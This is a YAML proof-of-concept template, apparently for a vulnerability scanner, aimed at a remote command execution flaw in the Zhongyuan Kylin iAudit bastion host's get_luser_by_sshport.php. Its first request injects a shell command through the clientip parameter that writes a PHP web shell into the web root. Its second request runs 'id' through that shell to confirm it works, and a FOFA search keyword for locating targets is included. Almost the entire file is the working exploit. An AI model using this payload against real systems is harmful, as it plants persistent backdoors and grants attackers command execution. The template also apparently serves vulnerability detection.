name: poc-yaml-zhongyuan-iAudit-getluserbysshport-php-code-exec
manual: true
transport: http
set:
    r1: randomLowercase(4)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /get_luser_by_sshport.php?clientip=1;echo+%27%3C?php%20var_dump(shell_exec($_GET[cmd]));?%3E%27%3E/opt/freesvr/web/htdocs/freesvr/audit/{{r1}}.php;&clientport=1
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /{{r1}}.php?cmd=id
        expression: response.status == 200 && response.body.bcontains(b"uid=") && response.body.bcontains(b"gid=")
expression: r0() && r1()
detail:
    author: cysec
    links:
        - http://cysec.com
    fofakeyword: cert.subject="Baolei"
    vulninfo: 中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞